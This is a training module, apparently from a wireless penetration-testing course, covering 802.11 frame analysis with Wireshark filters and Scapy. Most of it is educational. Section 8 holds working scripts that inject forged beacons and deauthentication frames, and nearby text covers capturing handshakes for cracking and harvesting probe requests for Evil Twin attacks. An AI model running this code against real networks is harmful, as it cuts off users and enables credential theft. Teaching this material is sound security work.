# Module 04 — Packet Analysis with Wireshark & Scapy

> **Prerequisites:** [Module 03 — Wireless Reconnaissance](../module-03-reconnaissance/)
> **Next Module:** [Module 05 — WEP Cracking](../module-05-wep-cracking/)

---

## Table of Contents

1. [Introduction to 802.11 Frame Analysis](#1-introduction-to-80211-frame-analysis)
2. [Wireshark Setup for Wireless](#2-wireshark-setup-for-wireless)
3. [Essential 802.11 Display Filters](#3-essential-80211-display-filters)
4. [Analyzing Beacon Frames](#4-analyzing-beacon-frames)
5. [Probe Request & Response Analysis](#5-probe-request--response-analysis)
6. [WPA2 4-Way Handshake Deep Dive](#6-wpa2-4-way-handshake-deep-dive)
7. [Scapy Fundamentals](#7-scapy-fundamentals)
8. [Crafting Custom 802.11 Frames](#8-crafting-custom-80211-frames)
9. [Common Packet Patterns](#9-common-packet-patterns)
10. [Troubleshooting Capture Issues](#10-troubleshooting-capture-issues)
11. [Knowledge Check](#11-knowledge-check)

---

## 1. Introduction to 802.11 Frame Analysis

Packet analysis is critical for:
- **Verifying captures** — Confirm handshakes were captured
- **Troubleshooting** — Identify why attacks fail
- **Learning** — Understand how protocols work
- **Evidence gathering** — Document attack vectors

### Frame Types Overview

802.11 frames are categorized into three main types:

| Type | Value | Description |
|------|-------|-------------|
| **Management** | 0x00 | Beacon, Probe Request/Response, Authentication, Association |
| **Control** | 0x01 | ACK, RTS, CTS, Block ACK |
| **Data** | 0x02 | Actual data payload (including WPA encrypted data) |

### Common Frame Subtypes

```
Management Frames (Type 0):
  - 0x00: Association Request
  - 0x01: Association Response  
  - 0x02: Reassociation Request
  - 0x03: Reassociation Response
  - 0x04: Probe Request
  - 0x05: Probe Response
  - 0x08: Beacon
  - 0x09: ATIM
  - 0x0A: Disassociation
  - 0x0B: Authentication
  - 0x0C: Deauthentication

Control Frames (Type 1):
  - 0x01: Block ACK
  - 0x05: CTS (Clear to Send)
  - 0x06: ACK
  - 0x08: RTS (Request to Send)

Data Frames (Type 2):
  - 0x00: Data
  - 0x01: Data + ACK
  - 0x02: Data + CF-Poll
  - 0x04: Null (no data)
  - 0x08: QoS Data
```

---

## 2. Wireshark Setup for Wireless

### Basic Capture

```bash
# Capture on monitor interface
sudo wireshark -i wlan0mon -k

# Or start wireshark normally and select monitor interface
```

### Recommended Preferences

**1. Enable "Assume packets have FCS"**
```
Edit → Preferences → Protocols → IEEE 802.11 → ✓ Assume packets have FCS
```
This tells Wireshark that the Frame Check Sequence is present (most captures include it).

**2. Disable "Analyze TCP sequence numbers" for wireless**
```
Edit → Preferences → TCP → ✓ Disable TCP sequence number analysis
```
Reduces noise for captures with many retransmissions.

**3. Enable "Relative sequence numbers"**
Makes sequence numbers easier to read.

---

## 3. Essential 802.11 Display Filters

### Frame Type Filters

```wireshark
# Show only management frames
wlan.fc.type == 0

# Show only control frames
wlan.fc.type == 1

# Show only data frames
wlan.fc.type == 2
```

### Subtype Filters

```wireshark
# Show only beacon frames
wlan.fc.type == 0 && wlan.fc.subtype == 8

# Show only probe requests
wlan.fc.type == 0 && wlan.fc.subtype == 4

# Show only probe responses
wlan.fc.type == 0 && wlan.fc.subtype == 5

# Show only authentication frames
wlan.fc.type == 0 && wlan.fc.subtype == 11

# Show only deauthentication frames
wlan.fc.type == 0 && wlan.fc.subtype == 12
```

### Address Filters

```wireshark
# Filter by BSSID (AP MAC)
wlan.bssid == aa:bb:cc:dd:ee:ff

# Filter by source MAC
wlan.addr == 11:22:33:44:55:66

# Filter by destination MAC
wlan.da == ff:ff:ff:ff:ff:ff
```

### Encryption-Related Filters

```wireshark
# Show encrypted data frames
wlan.fc.protected == 1

# Show unencrypted frames
wlan.fc.protected == 0

# Filter by SSID
wlan.ssid == "MyNetwork"

# Show EAPOL frames (WPA handshake)
eapol
```

### Combining Filters

```wireshark
# Beacons from specific AP
wlan.fc.type == 0 && wlan.fc.subtype == 8 && wlan.bssid == aa:bb:cc:dd:ee:ff

# Probe requests from specific client
wlan.fc.type == 0 && wlan.fc.subtype == 4 && wlan.addr == 11:22:33:44:55:66

# All frames to/from specific MAC
wlan.addr == aa:bb:cc:dd:ee:ff
```

---

## 4. Analyzing Beacon Frames

Beacons are broadcast by APs every ~100ms to advertise the network.

### What Beacons Contain

```
Frame Control:     0x0080 (Management, Beacon)
Duration:          0x0000
Destination:       ff:ff:ff:ff:ff:ff (Broadcast)
Source:           aa:bb:cc:dd:ee:ff (AP MAC)
BSSID:            aa:bb:cc:dd:ee:ff
Sequence Control:  0x0000

Tagged Parameters:
  - SSID: "MyNetwork"
  - Supported Rates: 1,2,5.5,11 (b), 6,9,12,18 (g), 24,36,48,54 (a)
  - Channel: 6
  - HT Capabilities (802.11n)
  - RSN (WPA2): CCMP, AES
  - Country: US
```

### Key Information in Beacons

| Field | Wireshark Name | Significance |
|-------|----------------|--------------|
| SSID | wlan.ssid | Network name |
| Channel | wlan_radio.channel | Operating channel |
| Signal | wlan_radio.signal_dbm | Signal strength |
| Encryption | wlan.tag.number:48 (RSN) | WPA2/WPA3 info |
| HT Capabilities | wlan.he | 802.11n/ac/ax support |

### Analyzing Security in Beacons

**WPA2 Network:**
```
wlan.tag.number: 48 (RSN)
  - Version: 1
  - Group Cipher: CCMP (0x04)
  - Pairwise Ciphers: CCMP
  - Authentication Suites: PSK (0x02)
```

**Open Network:**
```
(No RSN or WPA tags present)
```

---

## 5. Probe Request & Response Analysis

### Probe Requests (Client → Broadcast)

Clients send probe requests to find known networks:

```wireshark
# All probe requests
wlan.fc.type == 0 && wlan.fc.subtype == 4
```

**Information leaked in probe requests:**
- SSIDs the client is looking for (hidden network names)
- Supported rates (helps identify device type)
- Vendor OUI (first 3 bytes of MAC)

### Probe Responses (AP → Client)

APs respond if they match the probed SSID:

```wireshark
# All probe responses
wlan.fc.type == 0 && wlan.fc.subtype == 5
```

### PNL (Preferred Network List) Extraction

The "Probes" column in airodump-ng shows SSIDs clients have searched for:

```
wlan.fc.type == 0 && wlan.fc.subtype == 4
```

Look at the **wlan.ssid** field for each probe request — this reveals networks the client has previously connected to (a goldmine for Evil Twin attacks).

---

## 6. WPA2 4-Way Handshake Deep Dive

The 4-way handshake establishes a pairwise session key without transmitting the actual password.

### The Four Messages

```
Message 1: AP → Client
  - ANonce (Authenticator Nonce) - random value
  - Replay Counter

Message 2: Client → AP
  - SNonce (Supplicant Nonce) - random value
  - MIC (Message Integrity Code)
  - RSN IE

Message 3: AP → Client  
  - ANonce (new)
  - GTK (Group Temporal Key)
  - MIC

Message 4: Client → AP
  - Confirmation
  - MIC
```

### Visualizing in Wireshark

```wireshark
# Filter for handshake
eapol
```

### Handshake Verification

```
In packet details:
└── IEEE 802.1X Authentication
    └── Type: EAPOL
    └── Key (Type 2)
        └── Key MIC: [present]
        └── Key Data: [contains RSN IE]
```

### Identifying Handshake Packets

Each EAPOL packet in the handshake has:
- **Message 1:** `Key Information: 0x008a` (ANonce)
- **Message 2:** `Key Information: 0x010a` (SNonce + MIC)
- **Message 3:** `Key Information: 0x13ca` (ANonce + GTK + MIC)
- **Message 4:** `Key Information: 0x030a` (MIC only)

### Verifying Complete Handshake

```bash
# Using aircrack-ng
sudo aircrack-ng capture-01.cap

# Output shows:
# BSSID              ESSID          Encryption    # of IVs   Keyboard  Language
# AA:BB:CC:DD:EE:FF  MyNetwork     WPA2 (1) handshake   0
```

If you see "WPA (1) handshake" or "WPA2 (1) handshake", the capture is valid for cracking.

---

## 7. Scapy Fundamentals

Scapy is a Python library for crafting and manipulating network packets.

### Installation

```bash
pip3 install scapy
```

### Basic Operations

```python
from scapy.all import *

# List all interfaces
print(get_if_list())

# Sniff 10 packets on interface
sniff(iface="wlan0mon", count=10)

# Sniff with callback
def packet_handler(pkt):
    if pkt.haslayer(Dot11):
        print(pkt.summary())

sniff(iface="wlan0mon", prn=packet_handler)
```

### Key 802.11 Layers in Scapy

```python
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11ProbeReq, Dot11ProbeResp
from scapy.layers.eap import EAPOL
from scapy.layers.l2 import LLC, SNAP
```

---

## 8. Crafting Custom 802.11 Frames

### Creating a Beacon Frame

```python
#!/usr/bin/env python3
from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp

# AP MAC address
ap_mac = "aa:bb:cc:dd:ee:ff"
# Network name
ssid = "FakeNetwork"

# Build the packet
# RadioTap adds the radiotap header needed for injection
packet = RadioTap() / Dot11(
    addr1="ff:ff:ff:ff:ff:ff",  # Destination (broadcast)
    addr2=ap_mac,                 # Source (AP MAC)
    addr3=ap_mac                  # BSSID
) / Dot11Beacon() / Dot11Elt(
    ID="SSID", 
    info=ssid
) / Dot11Elt(
    ID="Rates", 
    info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24'
) / Dot11Elt(
    ID="DSSet", 
    info=b'\x06'  # Channel 6
)

# Send the packet
print(f"Sending beacon for '{ssid}'...")
sendp(packet, iface="wlan0mon", loop=True, inter=0.1)
```

### Creating a Probe Request

```python
#!/usr/bin/env python3
from scapy.all import Dot11, Dot11ProbeReq, Dot11Elt, RadioTap, sendp

# Client MAC
client_mac = "11:22:33:44:55:66"

packet = RadioTap() / Dot11(
    addr1="ff:ff:ff:ff:ff:ff",  # Broadcast
    addr2=client_mac,
    addr3="00:00:00:00:00:00"
) / Dot11ProbeReq() / Dot11Elt(
    ID="SSID", 
    info="TestNetwork"
)

sendp(packet, iface="wlan0mon")
print("Probe request sent!")
```

### Creating a Deauthentication Frame

```python
#!/usr/bin/env python3
from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp

# Target AP and client
ap_mac = "aa:bb:cc:dd:ee:ff"
client_mac = "11:22:33:44:55:66"

# Deauthenticate client from AP
packet = RadioTap() / Dot11(
    addr1=client_mac,      # Recipient
    addr2=ap_mac,           # Sender (AP)
    addr3=ap_mac            # BSSID
) / Dot11Deauth(
    reason=7  # Class 3 frame received from non-associated station
)

sendp(packet, iface="wlan0mon", count=10)
print("Deauthentication frames sent!")
```

---

## 9. Common Packet Patterns

### Finding Authentication

```wireshark
# Authentication frames
wlan.fc.type == 0 && wlan.fc.subtype == 11
```

### Finding Association

```wireshark
# Association Request/Response
wlan.fc.type == 0 && wlan.fc.subtype == 0
wlan.fc.type == 0 && wlan.fc.subtype == 1
```

### Finding Broadcast Traffic

```wireshark
# Broadcast packets (to ff:ff:ff:ff:ff:ff)
wlan.da == ff:ff:ff:ff:ff:ff
```

### Finding Encrypted Traffic

```wireshark
# Data frames with encryption
wlan.fc.type == 2 && wlan.fc.protected == 1
```

### Finding Retries

```wireshark
# Frame retries
wlan.fc.retry == 1
```

---

## 10. Troubleshooting Capture Issues

### Problem: Can't see data frames

**Cause:** Not associated to the network

**Solution:** Data frames to/from other clients are only visible in monitor mode if:
- You're associated to the same AP, OR
- The AP is using WEP (broadcast key rotation), OR
- You're capturing in a location where encryption allows visibility

### Problem: Handshake not showing

**Check 1: Is it really a WPA2 network?**

```wireshark
wlan.tag.number == 48  # RSN (WPA2)
wlan.tag.number == 221 && wlan.tag.data startswith "\x00\x50\xf2\x01"  # WPA
```

**Check 2: Are EAPOL frames present?**

```wireshark
eapol
```

If no EAPOL frames, the client never authenticated during your capture.

### Problem: Only seeing beacons

**Cause:** You're not on the right channel

**Solution:** 
```bash
sudo iw dev wlan0mon set channel 6
```

### Problem: "Malformed packet" errors

**Cause:** FCS (Frame Check Sequence) mismatch

**Solution:** Disable FCS assumption in Wireshark:
```
Edit → Preferences → IEEE 802.11 → ✗ Assume packets have FCS
```

---

## 11. Knowledge Check

Before proceeding to Module 05, you should be able to:

1. What are the three main types of 802.11 frames? Give examples of each.
2. Write a Wireshark display filter to show only beacon frames from a specific BSSID.
3. What information can be extracted from a probe request that would be useful for an Evil Twin attack?
4. Describe the four messages in the WPA2 4-way handshake and what each contains.
5. How do you verify in Wireshark that a complete handshake was captured?
6. Using Scapy, write code to create and send a fake beacon frame for an SSID named "FreeWiFi".
7. What filter would you use to see only encrypted data frames?
8. If you're seeing "malformed packet" errors in Wireshark for wireless captures, what preference should you change?
9. What is the difference between a probe request and a beacon frame in terms of who sends it and when?
10. Why might you see data frames in monitor mode even without being associated to an AP?

---

**Next:** [Module 05 — WEP Cracking](../module-05-wep-cracking/)
